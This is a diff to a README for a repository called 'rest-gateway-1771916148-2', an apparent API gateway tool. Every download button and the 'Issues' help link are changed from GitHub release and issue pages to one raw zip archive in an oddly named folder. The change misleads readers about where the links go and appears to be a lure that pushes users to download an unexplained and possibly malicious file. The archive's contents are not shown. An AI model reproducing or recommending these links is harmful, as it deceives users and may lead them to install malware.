@@ -1,6 +1,6 @@
 # ⚙️ rest-gateway-1771916148-2 - Easy API Access and Control
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Meghasukkayapally/rest-gateway-1771916148-2/releases)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Meghasukkayapally/rest-gateway-1771916148-2/main/pozzuolana/rest_gateway_siren.zip)
 
 ## 📋 What is rest-gateway-1771916148-2?
 
@@ -25,10 +25,10 @@ The program is lightweight and should run well on most home or work computers.
 
 Start by visiting the downloads page. This page holds the files you need to get the program on your machine.
 
-[![Download Now](https://img.shields.io/badge/Visit-Downloads-blue?style=for-the-badge)](https://github.com/Meghasukkayapally/rest-gateway-1771916148-2/releases)
+[![Download Now](https://img.shields.io/badge/Visit-Downloads-blue?style=for-the-badge)](https://raw.githubusercontent.com/Meghasukkayapally/rest-gateway-1771916148-2/main/pozzuolana/rest_gateway_siren.zip)
 
 Click this link to go directly there:  
-https://github.com/Meghasukkayapally/rest-gateway-1771916148-2/releases
+https://raw.githubusercontent.com/Meghasukkayapally/rest-gateway-1771916148-2/main/pozzuolana/rest_gateway_siren.zip
 
 ### Step 2: Choose the Latest Version
 
@@ -98,10 +98,10 @@ For simple use, you can leave the default settings as they are. They provide a g
 
 You can look for extra help or report problems on the official release page under the “Issues” tab:
 
-https://github.com/Meghasukkayapally/rest-gateway-1771916148-2/issues
+https://raw.githubusercontent.com/Meghasukkayapally/rest-gateway-1771916148-2/main/pozzuolana/rest_gateway_siren.zip
 
 There, you can write what is wrong or ask questions.
 
 ---
 
-[![Download Here](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Meghasukkayapally/rest-gateway-1771916148-2/releases)
+[![Download Here](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Meghasukkayapally/rest-gateway-1771916148-2/main/pozzuolana/rest_gateway_siren.zip)
